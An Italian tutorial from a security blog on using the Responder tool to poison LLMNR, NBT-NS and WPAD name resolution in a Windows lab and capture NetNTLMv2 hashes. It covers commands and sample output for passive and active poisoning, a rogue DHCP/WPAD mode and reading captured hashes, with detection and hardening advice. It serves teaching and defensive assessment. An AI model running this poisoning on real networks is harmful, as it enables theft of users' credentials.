---
title: >-
  Responder: Attacco LLMNR, NBT-NS e WPAD in LAN per Rubare Hash NTLM come un
  Vero Red Teamer
slug: responder
description: >-
  Scopri come un attaccante può sfruttare protocolli deboli come LLMNR, NBT-NS e
  WPAD per rubare credenziali di rete usando Responder e MultiRelay. Una guida
  completa e realistica per chi fa pentesting interno o vuole capire davvero
  come funzionano gli attacchi alle LAN Windows.
image: /responder.webp
draft: false
date: 2026-01-22T00:00:00.000Z
categories:
  - tools
subcategories:
  - recon
tags:
  - responder
  - mitm
---

# Responder: Attacco LLMNR, NBT-NS e WPAD in LAN per Rubare Hash NTLM come un Vero Red Teamer

Se in un lab AD “spariscono” share e nomi host, Responder ti fa vedere chi sta chiedendo cosa e quando una macchina Windows cade su fallback insicuri, con output verificabile nei log.

## Intro

Responder è un tool che risponde ai fallimenti di risoluzione nomi (LLMNR/NBT-NS/MDNS) e presenta servizi fasulli (SMB/HTTP/LDAP ecc.) per catturare tentativi di autenticazione in LAN.

In pentest interno “da lab” serve per validare una classe di debolezze: fallback legacy + auto-discovery (es. WPAD) + NTLM.

Cosa farai/imparerai:

* capire quando usare modalità passiva vs attiva
* avviare Responder sul segmento giusto senza “spararti sui piedi”
* leggere e interpretare i log (hash/credenziali catturate)
* riconoscere segnali di detection e applicare hardening

Nota etica: usa queste tecniche solo su lab/CTF/HTB/PG o sistemi di tua proprietà con autorizzazione esplicita.

## Cos’è Responder e dove si incastra nel workflow

> **In breve:** Responder ti aiuta a osservare o sfruttare fallback di name resolution e servizi rogue per catturare autenticazioni in una LAN di lab; è un “sensore offensivo” che produce prove nei log.

Responder ha senso quando:

* sei “dentro” una rete di lab e vuoi capire il rumore LLMNR/NBNS/MDNS
* vuoi dimostrare in modo ripetibile che le macchine tentano NTLM verso risposte non affidabili
* vuoi generare evidenza per hardening (disabilitare LLMNR/NBNS/WPAD, rafforzare SMB signing, ecc.)

Se dopo la cattura ottieni credenziali, il passo successivo nel workflow è la fase “post-creds” (enumerazione AD, permessi, percorsi di attacco). Per quella parte, come pillar del cluster, vedi BloodHound: mappa l’Active Directory come un hacker: [https://hackita.it/articoli/bloodhound/](https://hackita.it/articoli/bloodhound/)

Quando NON usarlo:

* su reti reali non autorizzate (anche solo “ascoltare” può impattare)
* su segmenti dove non controlli DHCP/DNS o dove potresti interferire con device critici

## Installazione / verifica versione / quick sanity check

> **In breve:** usa la repo ufficiale per avere feature aggiornate; verifica subito che `Responder.py --help` funzioni e che l’interfaccia di rete sia corretta.

Perché: installare in modo pulito evita problemi di dipendenze e opzioni “mancanti”.
Cosa aspettarti: una directory `Responder/` con `Responder.py`, `Responder.conf` e cartella `logs/`.
Comando:

```bash
sudo apt-get update
sudo apt-get install python3 python3-pip python3-netifaces
git clone https://github.com/lgandx/Responder.git
cd Responder
pip3 install -r requirements.txt
sudo python3 Responder.py --help
```

Esempio di output (può variare):

```text
Responder 3.x
Usage: Responder.py -I <iface> [options]
 -I, --interface=eth0   Network interface to use
 -A                    Analyze mode
 ...
```

Interpretazione: se vedi usage e opzioni principali, sei pronto.
Errore comune + fix: `Permission denied` → avvia con `sudo`; `python not found` → usa `python3`.

Perché: scegliere l’interfaccia giusta è metà del successo.
Cosa aspettarti: output con `eth0/wlan0` e indirizzo IP della tua macchina di lab.
Comando:

```bash
ip -br a
```

Esempio di output (può variare):

```text
lo               UNKNOWN        127.0.0.1/8 ::1/128
eth0             UP             10.10.10.50/24 fe80::1234/64
```

Interpretazione: qui l’interfaccia utile è `eth0`.
Errore comune + fix: usare l’interfaccia sbagliata → non vedi traffico, non catturi nulla.

## Modalità Analyze: prima ascolta, poi decidi

> **In breve:** in analyze mode Responder monitora passivamente: ottimo per capire se LLMNR/NBNS/MDNS sono davvero “vivi” nel tuo lab prima di avvelenare.

Perché: riduci impatto e fai un “reality check” sulla rete.
Cosa aspettarti: eventi di richieste nome e tentativi, senza risposte attive.
Comando:

```bash
sudo python3 Responder.py -I eth0 -A -v
```

Esempio di output (può variare):

```text
[Analyze] LLMNR query from 10.10.10.25 for FILESERVER01
[Analyze] NBT-NS query from 10.10.10.31 for WPAD
```

Interpretazione: stai vedendo chi chiede cosa; è il segnale che il fallback è attivo.
Errore comune + fix: “silenzio totale” → sei sul segmento sbagliato o il lab ha LLMNR/NBNS disabilitati.

Validation in lab: conferma con un client Windows di lab che un nome non risolvibile generi query (es. share digitata male).
Segnali di detection: traffico UDP 5355/137 e richieste WPAD “anomale”.
Hardening: disabilita LLMNR e NBT-NS dove possibile e rimuovi WPAD automatico.

## Poisoning controllato: avvio base e cosa cambia davvero

> **In breve:** l’avvio “base” abilita poisoning LLMNR/NBT-NS/MDNS secondo config e fa partire i server rogue necessari a catturare autenticazioni.

Perché: passare da osservare a validare con prove (log) la debolezza.
Cosa aspettarti: Responder “ascolta e risponde” alle richieste, e registra eventi in `logs/`.
Comando:

```bash
sudo python3 Responder.py -I eth0 -v
```

Esempio di output (può variare):

```text
[+] Poisoners:
    LLMNR  [ON]
    NBTNS  [ON]
    MDNS   [ON]
[+] Servers:
    SMB    [ON]
    HTTP   [ON]
[+] Listening for events...
```

Interpretazione: poisoning e server principali sono attivi; ora attendi trigger dal lab.
Errore comune + fix: avvio ok ma nessuna cattura → spesso non c’è traffico “triggerante” o i client non fanno fallback.

Validation in lab: da un Windows di lab prova un UNC verso host inesistente (es. `\\NOEXIST\share`) e verifica che compaia un tentativo.
Segnali di detection: spike di risposte LLMNR/NBNS dal tuo IP, e SMB/HTTP inbound verso il tuo host.
Hardening: disabilita LLMNR/NBNS, forza DNS corretto, blocca/gestisci WPAD, e richiedi SMB signing.

## Responder.conf: cosa accendere e cosa spegnere (rumore vs valore)

> **In breve:** Responder è potente perché ha molti “rogue servers”; nel lab conviene minimizzare rumore e attivare solo ciò che vuoi misurare.

Perché: più servizi rogue attivi = più superficie e più falsi positivi nel lab.
Cosa aspettarti: un file `Responder.conf` con toggle per core e server.
Comando:

```bash
grep -n "Responder Core" -n Responder.conf
```

Esempio di output (può variare):

```text
[Responder Core]
LLMNR = On
NBTNS = On
MDNS  = On
...
```

Interpretazione: qui decidi se tenere MDNS, e quali server far partire.
Errore comune + fix: cambiare config e non vedere differenze → riavvia Responder e verifica che stai editando il file corretto nella directory corrente.

Se stai facendo un lab di MITM più ampio (ARP spoofing, routing, ecc.), Bettercap può diventare il “contesto” di rete su cui innesti Responder: [https://hackita.it/articoli/bettercap/](https://hackita.it/articoli/bettercap/)

## Catture: dove finiscono le prove e come leggerle

> **In breve:** la tua “verità” è nei log: session log e file con hash/credenziali; se non salvi evidenza, non puoi riportare né hardening né detection.

Perché: in report conta la prova ripetibile (timestamp, IP, utente).
Cosa aspettarti: un `Responder-Session.log` e file specifici per protocolli.
Comando:

```bash
tail -f logs/Responder-Session.log
```

Esempio di output (può variare):

```text
[SMB] NTLMv2-SSP Client   : 10.10.10.25
[SMB] NTLMv2-SSP Username : CORP\jdoe
[SMB] NTLMv2-SSP Hash     : jdoe::CORP:112233...:aabbcc...:010100...
```

Interpretazione: hai una cattura NetNTLMv2 (non password in chiaro), utile per dimostrare esposizione.
Errore comune + fix: log vuoti → controlla che SMB/HTTP siano ON in config e che non ci sia firewall locale.

Validation in lab: ripeti lo stesso trigger e verifica che l’evento ricompaia con stesso client/utente.
Segnali di detection: autenticazioni NTLM verso host non attesi, richieste WPAD, e connessioni SMB verso IP “strano”.
Hardening: riduci NTLM dove possibile, preferisci Kerberos, e applica policy di rete coerenti.

Se dopo una cattura vuoi fare enumerazione “pulita” di directory (sempre in lab) con credenziali ottenute, collega qui Ldapsearch: enumerazione utenti e directory in attacco: [https://hackita.it/articoli/ldapsearch/](https://hackita.it/articoli/ldapsearch/)

## WPAD e proxy auth: quando è “troppo efficace” (e perché difendere)

> **In breve:** WPAD può generare autenticazioni automatiche; in lab è ottimo per dimostrare rischio, ma va gestito con estrema cautela perché impatta la navigazione.

Perché: WPAD spesso non richiede “errore umano”; basta auto-discovery attivo.
Cosa aspettarti: richieste al nome `WPAD` e tentativi di autenticazione HTTP/proxy.
Comando:

```bash
sudo python3 Responder.py -I eth0 -Pvd
```

Esempio di output (può variare):

```text
[ProxyAuth] Listening on 3128
[DHCP] Rogue DHCP enabled (lab only)
[HTTP] WPAD request from 10.10.10.31
```

Interpretazione: stai forzando un flusso proxy/WPAD nel lab; documenta impatto e spegni appena finito.
Errore comune + fix: “internet rotto” nel lab → hai toccato l’auto-proxy; ripristina e isola sempre l’esperimento.

Validation in lab: usa una VM Windows isolata con auto-proxy attivo e osserva richieste WPAD.
Segnali di detection: richieste DNS/LLMNR per `wpad`, connessioni HTTP/proxy verso host inatteso.
Hardening: disabilita WPAD automatico, crea record DNS/host controllati per wpad (in modo sicuro), e imposta proxy in modo esplicito.

Quando NON usarlo: se non puoi garantire isolamento del lab o se stai lavorando su un segmento “condiviso”.

## Errori comuni e troubleshooting (quelli che ti fanno perdere 1 ora)

> **In breve:** il 90% dei problemi è: permessi, interfaccia, porte occupate, firewall locale o assenza di trigger.

Perché: diagnosi rapida = iterazioni rapide nel lab.
Cosa aspettarti: identificare subito il collo di bottiglia.
Comando:

```bash
sudo netstat -tulpn | egrep ":(80|445|137|5355)\b"
```

Esempio di output (può variare):

```text
tcp   LISTEN  0  128 0.0.0.0:445   ... smbd
udp          0  0   0.0.0.0:137   ... nmbd
```

Interpretazione: se `smbd/nmbd` occupano porte, Responder non può bindare.
Errore comune + fix: ferma i servizi locali (solo in lab):

```bash
sudo systemctl stop smbd nmbd
```

Perché: vedere traffico ti dice se il problema è “rete” o “tool”.
Cosa aspettarti: pacchetti LLMNR (5355) e NBNS (137) quando fai trigger.
Comando:

```bash
sudo tcpdump -ni eth0 udp port 5355 or udp port 137 or tcp port 445
```

Esempio di output (può variare):

```text
IP 10.10.10.25.5355 > 224.0.0.252.5355: LLMNR query A FILESERVER01
IP 10.10.10.25.49821 > 10.10.10.50.445: Flags [S] ...
```

Interpretazione: se vedi query ma non catture, controlla config server rogue e firewall.
Errore comune + fix: `iptables` blocca inbound → apri nel lab o disabilita temporaneamente la policy locale.

## Alternative e tool correlati (cluster pillar → spoke → child)

> **In breve:** Responder non è l’unico; scegli tool alternativi in base a contesto (Windows-only, MITM più ampio, o pura discovery).

Alternative “spoke” per poisoning su ambienti Windows: Inveigh (PowerShell/Windows) può essere più “nativo” nel lab: [https://hackita.it/articoli/inveigh/](https://hackita.it/articoli/inveigh/)

Child per discovery NetBIOS prima del poisoning (riduce tentativi a vuoto): NBTScan può aiutarti a capire nomi e domini nel segmento: [https://hackita.it/articoli/nbtscan/](https://hackita.it/articoli/nbtscan/)

Child per proxy e ispezione HTTP(S) quando stai analizzando traffico applicativo (non LLMNR): Mitmproxy: [https://hackita.it/articoli/mitmproxy/](https://hackita.it/articoli/mitmproxy/)

Nota di prioritizzazione interna (senza fuffa): usa BloodHound come pillar (visione AD), poi Responder/Inveigh come spoke (acquisizione), poi NBTScan/Bettercap/Mitmproxy come child (supporto).

## Hardening & detection: cosa controllare dopo che “hai dimostrato” il problema

> **In breve:** se Responder funziona in lab, la difesa è: spegnere fallback (LLMNR/NBT-NS/WPAD), ridurre NTLM, e rendere inutilizzabili certi relay con SMB signing e policy coerenti.

Detection pratica:

* monitora richieste LLMNR (UDP 5355) e NBNS (UDP 137) da client verso multicast/broadcast
* allerta su query/connessioni verso `wpad` e su improvvisi proxy auto-config
* segnala SMB/HTTP verso host non autorizzati (soprattutto se interno non “server”)

Hardening pratico:

* disabilita LLMNR e valuta l’impatto su ambienti legacy
* disabilita WPAD/auto-proxy discovery dove non serve
* richiedi SMB signing dove possibile, e preferisci Kerberos su NTLM

Quando NON usarlo (difensivamente parlando): non “spegnere a caso” senza test; in ambienti legacy può emergere dipendenza reale da fallback.

## Scenario pratico: Responder su una macchina HTB/PG

> **In breve:** in un lab isolato, avvii Responder, provochi un fallback di name resolution e verifichi la cattura nei log, poi documenti detection e mitigazioni.

Ambiente: attacker Kali `10.10.10.50`, victim Windows `10.10.10.10` (stessa /24).

Obiettivo: dimostrare che la victim tenta NTLM verso servizi non affidabili quando DNS fallisce.

Perché: attivare poisoning e raccogliere evidenza.
Cosa aspettarti: Responder in ascolto e log di sessione popolato.
Comando:

```bash
sudo python3 Responder.py -I eth0 -v
```

Esempio di output (può variare):

```text
[+] Listening for events...
```

Interpretazione: Responder è pronto.
Errore comune + fix: interfaccia errata → verifica con `ip -br a`.

Azione di lab (sulla VM Windows): apri Esplora file e prova `\\NOEXIST\share`.

Perché: forzare il fallback e ottenere un tentativo SMB.
Cosa aspettarti: evento NetNTLM nei log.
Comando:

```bash
tail -n 30 logs/Responder-Session.log
```

Esempio di output (può variare):

```text
[SMB] NTLMv2-SSP Client   : 10.10.10.10
[SMB] NTLMv2-SSP Username : LAB\student
[SMB] NTLMv2-SSP Hash     : student::LAB:...
```

Interpretazione: hai la prova dell’esposizione.
Errore comune + fix: nessun evento → ripeti il trigger e controlla con `tcpdump` se la query arriva.

Detection + hardening: in difesa, cerca richieste LLMNR/NBNS anomale e tentativi verso `wpad`; poi disabilita LLMNR/NBT-NS e riduci NTLM, e rafforza SMB signing dove applicabile.

## Playbook 10 minuti: Responder in un lab

> **In breve:** sequenza rapida per passare da “setup” a “evidenza” senza perdere tempo in tentativi casuali.

### Step 1 – Identifica segmento e interfaccia corretti

Verifica IP e interfacce, poi scegli quella che “vede” la victim.

```bash
ip -br a
```

### Step 2 – Esegui una passata passiva (Analyze)

Prima misura se il fallback esiste davvero.

```bash
sudo python3 Responder.py -I eth0 -A -v
```

### Step 3 – Avvia poisoning base (lab isolato)

Passa in attivo solo se hai visto traffico utile.

```bash
sudo python3 Responder.py -I eth0 -v
```

### Step 4 – Forza un trigger controllato dalla VM Windows

Usa un nome host chiaramente inesistente per generare fallback.

### Step 5 – Conferma cattura nei log

Non fidarti dell’output a schermo: salva evidenza dai log.

```bash
tail -n 50 logs/Responder-Session.log
```

### Step 6 – Se non catturi, isola il problema con tcpdump

Capisci se è un problema di rete o di tool/config.

```bash
sudo tcpdump -ni eth0 udp port 5355 or udp port 137 or tcp port 445
```

### Step 7 – Documenta detection e mitigazione

Annota protocolli/porte osservate e quale controllo difensivo spegne l’attacco.

## Checklist operativa

> **In breve:** questa checklist ti evita i classici errori di contesto (interfaccia, porte, trigger, log) e ti costringe a produrre evidenza + mitigazione.

* Sei su lab/CTF/HTB/PG o rete di tua proprietà con permesso esplicito
* Interfaccia corretta identificata con `ip -br a`
* Hai provato `-A` (analyze) prima dell’attivo
* Hai isolato il segmento (niente dispositivi reali o condivisi)
* Log verificati in `logs/Responder-Session.log`
* Trigger ripetibile definito (UNC verso host inesistente o richiesta WPAD controllata)
* Porte libere (SMB/HTTP) e servizi locali non in conflitto
* `tcpdump` conferma che le query arrivano
* Hai scritto detection: UDP 5355/137 + richieste `wpad` + SMB inbound anomalo
* Hai scritto hardening: disabilita LLMNR/NBT-NS/WPAD e riduci NTLM dove possibile
* Hai indicato “quando NON usarlo” e impatto potenziale (legacy)
* Hai salvato evidenza (timestamp, IP, utente, tipo evento)

## Riassunto 80/20

> **In breve:** il minimo indispensabile: misura (analyze), valida (poison), prova (log), difendi (hardening).

| Obiettivo                     | Azione pratica                 | Comando/Strumento                                |
| ----------------------------- | ------------------------------ | ------------------------------------------------ |
| Capire se LLMNR/NBNS è attivo | ascolto passivo                | `Responder.py -I eth0 -A -v`                     |
| Avviare lab poisoning base    | attivo e in attesa di trigger  | `Responder.py -I eth0 -v`                        |
| Verificare catture            | controlla session log          | `tail -f logs/Responder-Session.log`             |
| Capire “perché non funziona”  | osserva pacchetti in arrivo    | `tcpdump -ni eth0 udp port 5355 or udp port 137` |
| Evitare conflitti di porte    | verifica listener locali       | `netstat -tulpn`                                 |
| Produrre mitigazione          | spegni fallback + rafforza SMB | `SMB signing + disable LLMNR/WPAD`               |

## Concetti controintuitivi

> **In breve:** gli errori tipici non sono “tool”, ma contesto (segmento, trigger, policy) e aspettative sbagliate su cosa stai catturando.

* **“Se Responder gira, allora catturo subito”**
  No: senza trigger o fallback attivo puoi vedere zero. Prima misura con `-A`, poi genera un trigger controllato in lab.
* **“Ho preso un hash = ho la password”**
  No: NetNTLM è evidenza di autenticazione, non password in chiaro. Usalo per dimostrare rischio e guidare hardening.
* **“WPAD è solo un dettaglio di proxy”**
  In realtà può innescare autenticazioni automatiche. In lab è ottimo per demo, ma è anche il punto più “impattante”.
* **“Basta spegnere una cosa e siamo ok”**
  Spesso serve difesa a strati: disabilitare fallback + ridurre NTLM + policy SMB più robuste + monitoraggio.

## FAQ

> **In breve:** risposte rapide ai blocchi più comuni quando stai imparando Responder in lab.

D: Responder non cattura nulla, ma vedo query in analyze. Perché?

R: Spesso i server rogue non sono attivi in config o non arriva un trigger che provoca autenticazione. Verifica `Responder.conf` e forza un UNC verso host inesistente.

D: Posso usare Responder su Wi-Fi?

R: Sì in lab, ma devi essere sullo stesso segmento e vedere traffico utile. Su Wi-Fi isolati/guest spesso non vedi broadcast come ti aspetti.

D: Perché `smbd` mi rompe Responder?

R: Perché occupa la porta SMB (445). In lab ferma `smbd/nmbd` oppure usa un ambiente dove non sono in esecuzione.

D: Qual è la mitigazione “più efficace” contro i relay NTLM?

R: In generale ridurre NTLM e richiedere firme/controlli robusti (es. SMB signing) aiuta molto, insieme a disabilitare LLMNR/NBT-NS e controllare WPAD.

D: Responder è “rumoroso”?

R: Può esserlo se attivi troppi server e rispondi a tutto. Parti con `-A`, poi abilita solo ciò che serve e documenta l’impatto.

## Link utili su HackIta.it

> **In breve:** pagine del cluster ordinate per passare da visione (pillar) a acquisizione (spoke) a supporto (child).

* BloodHound: mappa l’Active Directory come un hacker: [https://hackita.it/articoli/bloodhound/](https://hackita.it/articoli/bloodhound/)
* Ldapsearch: enumerazione utenti e directory in attacco: [https://hackita.it/articoli/ldapsearch/](https://hackita.it/articoli/ldapsearch/)
* Inveigh: attacchi su reti Windows per rubare hash NTLM via LLMNR/NBNS/WPAD: [https://hackita.it/articoli/inveigh/](https://hackita.it/articoli/inveigh/)
* NBTScan: scansione silenziosa della rete Windows via NetBIOS: [https://hackita.it/articoli/nbtscan/](https://hackita.it/articoli/nbtscan/)
* Bettercap: MITM, sniffing e spoofing in network hacking: [https://hackita.it/articoli/bettercap/](https://hackita.it/articoli/bettercap/)
* Mitmproxy: analizza e manipola traffico HTTPS da terminale: [https://hackita.it/articoli/mitmproxy/](https://hackita.it/articoli/mitmproxy/)

Pagine istituzionali:

* /supporto/
* /contatto/
* /articoli/
* /servizi/
* /about/
* /categorie/

## Riferimenti autorevoli

> **In breve:** fonti primarie per opzioni/behavior di Responder e per la difesa (SMB signing).

* Responder (repo ufficiale): [https://github.com/lgandx/Responder](https://github.com/lgandx/Responder)
* Microsoft Learn – SMB signing (difesa contro relay/spoofing): [https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing)

## CTA finale HackITA

Supporta HackIta: se questi contenuti ti fanno risparmiare ore di lab e ti aiutano a ragionare “da attacker” in modo etico, considera una donazione su /supporto/

Formazione 1:1: se vuoi fare il salto (AD labs, metodologia, report), trovi percorsi e coaching su /servizi/

Servizi per aziende/assessment: per attività autorizzate (assessment, hardening, test interni) e lavoro serio con deliverable, contattami da /servizi/
